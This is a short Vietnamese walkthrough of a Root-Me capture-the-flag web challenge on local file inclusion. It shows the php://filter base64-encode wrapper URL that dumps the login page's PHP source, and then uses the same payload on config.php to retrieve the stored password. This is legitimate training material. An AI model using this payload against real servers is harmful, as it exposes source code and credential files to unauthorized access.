Google từ khóa PHP filter, sẽ thấy đó là 1 PHP wrapper(đây là [link](https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb) tham khảo). Gõ vào đường dẫn như sau:

> http://challenge01.root-me.org/web-serveur/ch12/index.php?inc=php://filter/convert.base64-encode/resource=login.php

Sẽ hiện ra 1 đoạn mã đã được base64 encode, nhét vào decoder ta được đoạn code php ẩn của trang web như sau:

```php
<?php
include("config.php");

if ( isset($_POST["username"]) && isset($_POST["password"]) ){
    if ($_POST["username"]==$username && $_POST["password"]==$password){
      print("<h2>Welcome back !</h2>");
      print("To validate the challenge use this password<br/><br/>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");
    }
} else {
?>

<form action="" method="post">
  Login&nbsp;<br/>
  <input type="text" name="username" /><br/><br/>
  Password&nbsp;<br/>
  <input type="password" name="password" /><br/><br/>
  <br/><br/>
  <input type="submit" value="connect" /><br/><br/>
</form>

<?php } ?>
```

Vậy ta đã biết username và password nằm trong file config.php. Thực hiện việc tương tự như trên 

>http://challenge01.root-me.org/web-serveur/ch12/index.php?inc=php://filter/convert.base64-encode/resource=config.php

sẽ lấy được password